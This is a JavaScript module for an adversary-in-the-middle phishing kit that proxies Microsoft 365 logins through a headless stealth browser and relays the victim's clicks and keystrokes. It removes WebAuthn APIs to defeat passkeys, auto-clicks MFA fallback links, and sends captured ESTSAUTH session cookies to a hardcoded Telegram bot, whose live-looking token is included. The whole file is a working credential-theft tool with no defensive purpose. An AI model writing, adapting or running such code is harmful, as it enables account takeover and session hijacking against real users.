const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(cookies, finalUrl) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    // Filter for essential auth cookies to ensure we stay under Telegram's character limit
    const authKeys = cookies.filter(c => ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'RPSSecAuth'].includes(c.name));
    
    const message = `🚀 *SESSION CAPTURED*\n*URL:* ${finalUrl}\n\n*Auth Cookies:* \`\`\`json\n${JSON.stringify(authKeys, null, 2)}\n\`\`\``;
    try {
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
        console.log("[TELEGRAM] Alert dispatched.");
    } catch (e) { console.error('[EXFIL-ERR]', e.message); }
}

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();

        /**
         * 2026 NUCLEAR PASSKEY KILL-SWITCH
         * Forces Microsoft to fall back to standard MFA/Password by deleting 
         * modern auth APIs from the browser context before the page loads.
         */
        await page.evaluateOnNewDocument(() => {
            // Delete the API so Microsoft thinks this browser is from 2018
            delete window.PublicKeyCredential;
            
            if (navigator.credentials) {
                const originalGet = navigator.credentials.get;
                navigator.credentials.get = function(opt) {
                    if (opt && opt.publicKey) {
                        // Throwing this error forces the 'Sign in another way' UI to appear
                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    }
                    return originalGet.call(this, opt);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        
        // Use Firefox User-Agent to dodge Chrome's aggressive WebAuthn prompts
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1200);

        // AUTO-CLICKER: Periodically scans for "Skip" or "Cancel" links
        const scanner = setInterval(async () => {
            try {
                const bypass = await page.$('#iShowSkip, #idBtn_Back, a[data-bind*="switchToPassword"]');
                if (bypass) {
                    console.log("[AUTO-BYPASS] Clicking Fallback Link");
                    await bypass.click();
                    await emitFrame();
                }
            } catch (e) {}
        }, 2500);

        // Success Detector
        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            console.log(`[NAV-LOG] ${url}`);
            if (['office.com', 'shell/homepage', 'microsoft365.com'].some(k => url.includes(k))) {
                console.log("[SUCCESS] Reached Dashboard. Extracting...");
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies, url);
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(scanner);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
